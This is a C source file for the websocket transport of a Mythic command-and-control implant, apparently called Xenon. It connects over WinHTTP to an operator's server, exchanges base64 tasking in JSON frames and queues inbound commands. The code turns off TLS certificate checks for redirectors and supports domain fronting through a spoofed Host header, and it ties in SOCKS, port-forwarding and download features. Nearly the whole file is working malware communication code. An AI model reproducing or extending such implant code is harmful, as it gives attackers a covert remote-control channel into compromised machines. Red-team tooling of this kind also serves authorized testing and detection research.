#include "TransportWebsocket.h"

#include "Utils.h"
#include "Debug.h"
#include "Sleep.h"
#include "Config.h"

#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
#include "Tasks/AsyncBof.h"
#endif

#include <stdio.h>
#include <string.h>
#include <winhttp.h>

/* This file is the the Mythic Websocket profile (Push only) */
#ifdef WEBSOCKET_TRANSPORT

#ifndef WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET
#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET 114
#endif

#ifndef WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS
#define WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS 1000
#endif

/* Short pump interval when local tunnels/downloads need servicing */
#define WS_LOCAL_PUMP_MS 100

/* Receive buffer growth */
#define WS_RECV_CHUNK 8192

/**
 * @brief Convert ANSI string to wide (LocalAlloc). Caller frees.
 */
static WCHAR* WsAnsiToWide(LPCSTR ansi)
{
    int len;
    WCHAR* wide;

    if ( !ansi )
        return NULL;

    len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    if ( len <= 0 )
        return NULL;

    wide = (WCHAR*)LocalAlloc(LPTR, len * sizeof(WCHAR));
    if ( !wide )
        return NULL;

    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wide, len);
    return wide;
}

/**
 * @brief Extract JSON "data" string value from a websocket text frame.
 *        Expects {"client":...,"data":"<payload>","tag":...} style.
 *        Caller frees *ppOut with LocalFree.
 */
static BOOL WsExtractDataField(PBYTE frame, SIZE_T frameLen, PBYTE* ppOut, SIZE_T* pOutLen)
{
    PCHAR start;
    PCHAR end;
    PCHAR haystack;
    SIZE_T dataLen;
    PBYTE copy;

    if ( !frame || frameLen == 0 || !ppOut || !pOutLen )
        return FALSE;

    *ppOut   = NULL;
    *pOutLen = 0;

    /* Ensure NULL-terminated search buffer */
    haystack = (PCHAR)LocalAlloc(LPTR, frameLen + 1);
    if ( !haystack )
        return FALSE;

    memcpy(haystack, frame, frameLen);

    start = strstr(haystack, "\"data\"");
    if ( !start )
    {
        LocalFree(haystack);
        return FALSE;
    }

    start = strchr(start + 6, '"');
    if ( !start )
    {
        LocalFree(haystack);
        return FALSE;
    }
    start++; /* past opening quote */

    end = strchr(start, '"');
    if ( !end )
    {
        LocalFree(haystack);
        return FALSE;
    }

    dataLen = (SIZE_T)(end - start);
    copy = (PBYTE)LocalAlloc(LPTR, dataLen + 1);
    if ( !copy )
    {
        LocalFree(haystack);
        return FALSE;
    }

    memcpy(copy, start, dataLen);
    LocalFree(haystack);

    *ppOut   = copy;
    *pOutLen = dataLen;
    return TRUE;
}

/**
 * @brief Enqueue inbound Mythic base64 blob and signal the main loop.
 */
static VOID WsEnqueueInbound(PBYTE buffer, SIZE_T length)
{
    PWS_INBOUND_NODE node;

    if ( !buffer || length == 0 )
        return;

    node = (PWS_INBOUND_NODE)LocalAlloc(LPTR, sizeof(WS_INBOUND_NODE));
    if ( !node )
    {
        LocalFree(buffer);
        return;
    }

    node->Buffer = buffer;
    node->Length = length;
    node->Next   = NULL;

    WaitForSingleObject(xenonConfig->WsQueueMutex, INFINITE);

    if ( !xenonConfig->WsInboundHead )
    {
        xenonConfig->WsInboundHead = node;
        xenonConfig->WsInboundTail = node;
    }
    else
    {
        xenonConfig->WsInboundTail->Next = node;
        xenonConfig->WsInboundTail = node;
    }

    ReleaseMutex(xenonConfig->WsQueueMutex);

    if ( xenonConfig->WsInboundEvent )
        SetEvent(xenonConfig->WsInboundEvent);
}

/**
 * @brief Mark disconnected and wake the main loop.
 */
static VOID WsMarkDisconnected(void)
{
    xenonConfig->WsConnected = FALSE;
    if ( xenonConfig->WsInboundEvent )
        SetEvent(xenonConfig->WsInboundEvent);
}

/**
 * @brief Dedicated receive thread — blocks on WinHttpWebSocketReceive.
 */
static DWORD WINAPI WsReceiveThread(LPVOID lpParam)
{
    PBYTE  accum     = NULL;
    SIZE_T accumLen  = 0;
    SIZE_T accumCap  = 0;
    BYTE   chunk[WS_RECV_CHUNK];
    DWORD  bytesRead = 0;
    WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

    UNREFERENCED_PARAMETER(lpParam);

    _dbg("[WS] Receive thread started");

    while ( !xenonConfig->WsStopRecv && xenonConfig->WsHandle )
    {
        DWORD status = WinHttpWebSocketReceive(
            (HINTERNET)xenonConfig->WsHandle,
            chunk,
            sizeof(chunk),
            &bytesRead,
            &bufferType
        );

        if ( xenonConfig->WsStopRecv )
            break;

        if ( status != ERROR_SUCCESS )
        {
            _err("[WS] WinHttpWebSocketReceive failed: %lu", status);
            WsMarkDisconnected();
            break;
        }

        if ( bufferType == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE )
        {
            _dbg("[WS] Server closed websocket");
            WsMarkDisconnected();
            break;
        }

        /* Only process text/binary message data (ignore control) */
        if ( bufferType != WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE &&
             bufferType != WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE &&
             bufferType != WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE &&
             bufferType != WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE )
        {
            continue;
        }

        if ( bytesRead > 0 )
        {
            if ( accumLen + bytesRead > accumCap )
            {
                SIZE_T newCap = (accumCap == 0) ? (bytesRead + WS_RECV_CHUNK) : (accumCap * 2);
                PBYTE  resized;

                while ( newCap < accumLen + bytesRead )
                    newCap *= 2;

                if ( !accum )
                    resized = (PBYTE)LocalAlloc(LPTR, newCap);
                else
                    resized = (PBYTE)LocalReAlloc(accum, newCap, LMEM_MOVEABLE | LMEM_ZEROINIT);

                if ( !resized )
                {
                    _err("[WS] Failed to grow receive buffer");
                    if ( accum )
                        LocalFree(accum);
                    accum    = NULL;
                    accumLen = 0;
                    accumCap = 0;
                    WsMarkDisconnected();
                    break;
                }
                accum    = resized;
                accumCap = newCap;
            }

            memcpy(accum + accumLen, chunk, bytesRead);
            accumLen += bytesRead;
        }

        /* Complete message (not a fragment) */
        if ( bufferType == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
             bufferType == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE )
        {
            PBYTE dataField = NULL;
            SIZE_T dataLen  = 0;

            if ( WsExtractDataField(accum, accumLen, &dataField, &dataLen) )
            {
                _dbg("[WS] Inbound frame data field: %zu bytes", dataLen);
                WsEnqueueInbound(dataField, dataLen);
            }
            else
            {
                _err("[WS] Failed to extract data field from frame");
            }

            if ( accum )
            {
                LocalFree(accum);
                accum    = NULL;
                accumLen = 0;
                accumCap = 0;
            }
        }
    }

    if ( accum )
        LocalFree(accum);

    _dbg("[WS] Receive thread exiting");
    return 0;
}

/**
 * @brief Tear down WinHTTP handles without touching sync objects used by main.
 */
static VOID WsCloseHandles(void)
{
    if ( xenonConfig->WsHandle )
    {
        WinHttpWebSocketClose(
            (HINTERNET)xenonConfig->WsHandle,
            WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
            NULL,
            0
        );
        WinHttpCloseHandle((HINTERNET)xenonConfig->WsHandle);
        xenonConfig->WsHandle = NULL;
    }

    if ( xenonConfig->WsRequest )
    {
        WinHttpCloseHandle((HINTERNET)xenonConfig->WsRequest);
        xenonConfig->WsRequest = NULL;
    }

    if ( xenonConfig->WsConnection )
    {
        WinHttpCloseHandle((HINTERNET)xenonConfig->WsConnection);
        xenonConfig->WsConnection = NULL;
    }

    if ( xenonConfig->WsSession )
    {
        WinHttpCloseHandle((HINTERNET)xenonConfig->WsSession);
        xenonConfig->WsSession = NULL;
    }
}

BOOL WebsocketIsConnected(void)
{
    return xenonConfig->WsConnected && xenonConfig->WsHandle != NULL;
}

BOOL WebsocketNeedsLocalPump(void)
{
#if defined(INCLUDE_CMD_LINK)
    /* TODO: This is not ideal because if there are any links,
     it will cause websocket to constantly poll, but it works for now. */
    if ( xenonConfig->Links )
        return TRUE;
#endif

#if defined(INCLUDE_CMD_SOCKS)
    if ( xenonConfig->SocksConnections )
        return TRUE;
#endif

#if defined(INCLUDE_CMD_RPORTFWD)
    if ( xenonConfig->RportfwdConnections )
        return TRUE;
#endif

#if defined(INCLUDE_CMD_DOWNLOAD)
    if ( xenonConfig->DownloadQueue )
        return TRUE;
#endif

    return FALSE;
}

VOID WebsocketClose(void)
{
    xenonConfig->WsStopRecv  = TRUE;
    xenonConfig->WsConnected = FALSE;

    /* Unblock receive thread */
    if ( xenonConfig->WsHandle )
    {
        WinHttpWebSocketClose(
            (HINTERNET)xenonConfig->WsHandle,
            WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
            NULL,
            0
        );
    }

    if ( xenonConfig->WsRecvThread )
    {
        WaitForSingleObject(xenonConfig->WsRecvThread, 5000);
        CloseHandle(xenonConfig->WsRecvThread);
        xenonConfig->WsRecvThread = NULL;
    }

    WsCloseHandles();

    /* Drain inbound queue */
    if ( xenonConfig->WsQueueMutex )
    {
        WaitForSingleObject(xenonConfig->WsQueueMutex, INFINITE);
        while ( xenonConfig->WsInboundHead )
        {
            PWS_INBOUND_NODE node = xenonConfig->WsInboundHead;
            xenonConfig->WsInboundHead = node->Next;
            if ( node->Buffer )
                LocalFree(node->Buffer);
            LocalFree(node);
        }
        xenonConfig->WsInboundTail = NULL;
        ReleaseMutex(xenonConfig->WsQueueMutex);
    }
}

BOOL WebsocketConnect(void)
{
    BOOL    success     = FALSE;
    WCHAR*  wHost       = NULL;
    WCHAR*  wPath       = NULL;
    WCHAR*  wAgent      = NULL;
    WCHAR*  wHeaders    = NULL;
    DWORD   flags       = 0;
    DWORD   statusCode  = 0;
    DWORD   statusSize  = sizeof(statusCode);
    CHAR    pathA[512]  = { 0 };
    CHAR    headersA[1024] = { 0 };
    HINTERNET hWebSocket = NULL;

    /* Already connected */
    if ( WebsocketIsConnected() )
        return TRUE;

    /* Clean previous attempt */
    WebsocketClose();

    xenonConfig->WsStopRecv = FALSE;

    if ( !xenonConfig->WsInboundEvent )
        xenonConfig->WsInboundEvent = CreateEventA(NULL, FALSE, FALSE, NULL);

    if ( !xenonConfig->WsSendMutex )
        xenonConfig->WsSendMutex = CreateMutexA(NULL, FALSE, NULL);

    if ( !xenonConfig->WsQueueMutex )
        xenonConfig->WsQueueMutex = CreateMutexA(NULL, FALSE, NULL);

    if ( !xenonConfig->WsInboundEvent || !xenonConfig->WsSendMutex || !xenonConfig->WsQueueMutex )
    {
        _err("[WS] Failed to create sync objects");
        goto END;
    }

    wHost  = WsAnsiToWide(xenonConfig->WsHostname);
    wAgent = WsAnsiToWide(xenonConfig->WsUserAgent);

    /* Path: /endpoint */
    if ( xenonConfig->WsEndpoint && xenonConfig->WsEndpoint[0] == '/' )
        snprintf(pathA, sizeof(pathA), "%s", xenonConfig->WsEndpoint);
    else
        snprintf(pathA, sizeof(pathA), "/%s", xenonConfig->WsEndpoint ? xenonConfig->WsEndpoint : "socket");

    wPath = WsAnsiToWide(pathA);

    if ( !wHost || !wPath || !wAgent )
    {
        _err("[WS] Failed to convert strings to wide");
        goto END;
    }

    xenonConfig->WsSession = WinHttpOpen(
        wAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if ( !xenonConfig->WsSession )
    {
        _err("[WS] WinHttpOpen failed: %lu", GetLastError());
        goto END;
    }

    xenonConfig->WsConnection = WinHttpConnect(
        (HINTERNET)xenonConfig->WsSession,
        wHost,
        (INTERNET_PORT)xenonConfig->WsPort,
        0
    );

    if ( !xenonConfig->WsConnection )
    {
        _err("[WS] WinHttpConnect failed: %lu", GetLastError());
        goto END;
    }

    flags = xenonConfig->WsIsSSL ? WINHTTP_FLAG_SECURE : 0;

    xenonConfig->WsRequest = WinHttpOpenRequest(
        (HINTERNET)xenonConfig->WsConnection,
        L"GET",
        wPath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if ( !xenonConfig->WsRequest )
    {
        _err("[WS] WinHttpOpenRequest failed: %lu", GetLastError());
        goto END;
    }

    /* Upgrade to websocket */
    if ( !WinHttpSetOption((HINTERNET)xenonConfig->WsRequest,
                           WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
                           NULL, 0) )
    {
        _err("[WS] WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET failed: %lu", GetLastError());
        goto END;
    }

    /* Ignore TLS errors for wss (self-signed / redirectors) */
    if ( xenonConfig->WsIsSSL )
    {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        WinHttpSetOption((HINTERNET)xenonConfig->WsRequest,
                         WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
    }

    /* Accept-Type: Push — required for Mythic push websocket */
    snprintf(headersA, sizeof(headersA), "Accept-Type: Push\r\n");

    if ( xenonConfig->WsDomainFront && xenonConfig->WsDomainFront[0] != '\0' )
    {
        SIZE_T used = strlen(headersA);
        snprintf(headersA + used, sizeof(headersA) - used, "Host: %s\r\n", xenonConfig->WsDomainFront);
    }

    wHeaders = WsAnsiToWide(headersA);
    if ( !wHeaders )
    {
        _err("[WS] Failed to convert headers");
        goto END;
    }

    if ( !WinHttpSendRequest(
            (HINTERNET)xenonConfig->WsRequest,
            wHeaders,
            (DWORD)-1,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0) )
    {
        _err("[WS] WinHttpSendRequest failed: %lu", GetLastError());
        goto END;
    }

    if ( !WinHttpReceiveResponse((HINTERNET)xenonConfig->WsRequest, NULL) )
    {
        _err("[WS] WinHttpReceiveResponse failed: %lu", GetLastError());
        goto END;
    }

    if ( !WinHttpQueryHeaders(
            (HINTERNET)xenonConfig->WsRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode,
            &statusSize,
            WINHTTP_NO_HEADER_INDEX) )
    {
        _err("[WS] WinHttpQueryHeaders failed: %lu", GetLastError());
        goto END;
    }

    if ( statusCode != 101 )
    {
        _err("[WS] Expected HTTP 101, got %lu", statusCode);
        goto END;
    }

    hWebSocket = WinHttpWebSocketCompleteUpgrade((HINTERNET)xenonConfig->WsRequest, NULL);
    if ( !hWebSocket )
    {
        _err("[WS] WinHttpWebSocketCompleteUpgrade failed: %lu", GetLastError());
        goto END;
    }

    /* Request handle no longer needed after upgrade */
    WinHttpCloseHandle((HINTERNET)xenonConfig->WsRequest);
    xenonConfig->WsRequest = NULL;

    xenonConfig->WsHandle    = (HANDLE)hWebSocket;
    xenonConfig->WsConnected = TRUE;

    xenonConfig->WsRecvThread = CreateThread(NULL, 0, WsReceiveThread, NULL, 0, NULL);
    if ( !xenonConfig->WsRecvThread )
    {
        _err("[WS] Failed to start receive thread: %lu", GetLastError());
        xenonConfig->WsConnected = FALSE;
        goto END;
    }

    _dbg("[WS] Connected %s://%s:%u%s (Push)", xenonConfig->WsIsSSL ? "wss" : "ws", xenonConfig->WsHostname, xenonConfig->WsPort, pathA);
    success = TRUE;

END:
    if ( wHost )    LocalFree(wHost);
    if ( wPath )    LocalFree(wPath);
    if ( wAgent )   LocalFree(wAgent);
    if ( wHeaders ) LocalFree(wHeaders);

    if ( !success )
    {
        WebsocketClose();
    }

    return success;
}

BOOL WebsocketSend(PPackage package)
{
    BOOL   success = FALSE;
    PCHAR  json    = NULL;
    SIZE_T jsonLen = 0;
    DWORD  status  = 0;

    if ( !package || !package->buffer || package->length == 0 )
        return FALSE;

    if ( !WebsocketIsConnected() )
    {
        if ( !WebsocketConnect() )
            return FALSE;
    }

    /* {"client":true,"data":"<b64>","tag":""} */
    jsonLen = package->length + 64;
    json = (PCHAR)LocalAlloc(LPTR, jsonLen);
    if ( !json )
        return FALSE;

    snprintf(json, jsonLen, "{\"client\":true,\"data\":\"%s\",\"tag\":\"\"}", (PCHAR)package->buffer);

    WaitForSingleObject(xenonConfig->WsSendMutex, INFINITE);

    status = WinHttpWebSocketSend(
        (HINTERNET)xenonConfig->WsHandle,
        WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
        (PVOID)json,
        (DWORD)strlen(json)
    );

    ReleaseMutex(xenonConfig->WsSendMutex);

    if ( status != ERROR_SUCCESS )
    {
        _err("[WS] WinHttpWebSocketSend failed: %lu", status);
        WsMarkDisconnected();
        goto END;
    }

    _dbg("[WS] Sent %zu byte JSON frame", strlen(json));
    success = TRUE;

END:
    if ( json )
    {
        memset(json, 0, jsonLen);
        LocalFree(json);
    }
    return success;
}

BOOL WebsocketReceive(PBYTE* ppOutData, SIZE_T* pOutLen)
{
    PWS_INBOUND_NODE node = NULL;

    if ( !ppOutData || !pOutLen )
        return FALSE;

    *ppOutData = NULL;
    *pOutLen   = 0;

    if ( !xenonConfig->WsQueueMutex )
        return FALSE;

    WaitForSingleObject(xenonConfig->WsQueueMutex, INFINITE);

    if ( xenonConfig->WsInboundHead )
    {
        node = xenonConfig->WsInboundHead;
        xenonConfig->WsInboundHead = node->Next;
        if ( !xenonConfig->WsInboundHead )
            xenonConfig->WsInboundTail = NULL;
    }

    ReleaseMutex(xenonConfig->WsQueueMutex);

    if ( !node )
        return FALSE;

    *ppOutData = node->Buffer;
    *pOutLen   = node->Length;
    LocalFree(node);
    return TRUE;
}

DWORD WebsocketWaitInbound(DWORD dwMilliseconds)
{
    if ( !xenonConfig->WsInboundEvent )
        return WAIT_FAILED;
    
#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
    /* Wait on two possible events: (1) websocket inbound event, (2) async bof wakeup event */
    const  HANDLE Events[] = { xenonConfig->WsInboundEvent, g_AsyncBofWakeup };    
    return WaitForMultipleObjects(2, Events, FALSE, dwMilliseconds);
#else
    return WaitForSingleObject(xenonConfig->WsInboundEvent, dwMilliseconds);
#endif
}

#endif // #ifdef WEBSOCKET_TRANSPORT
